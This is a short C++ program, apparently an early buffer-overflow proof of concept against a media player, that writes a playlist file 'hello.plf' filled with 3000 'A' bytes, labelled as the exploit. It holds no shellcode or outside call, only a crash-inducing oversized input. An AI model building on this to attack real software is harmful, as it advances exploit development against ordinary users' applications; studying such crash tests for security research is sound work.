//Filename: attack-dvdxplayer.cpp
#include <iostream>
#include <fstream>
#include <string>

using namespace std;

int main() {
	string filename("hello.plf");
	string junk(3000,'A');
	string exploit = junk;
	
	ofstream fout(filename.c_str(),ios::binary);
	fout << exploit;
	
	cout << "OK: " << filename << endl;
}
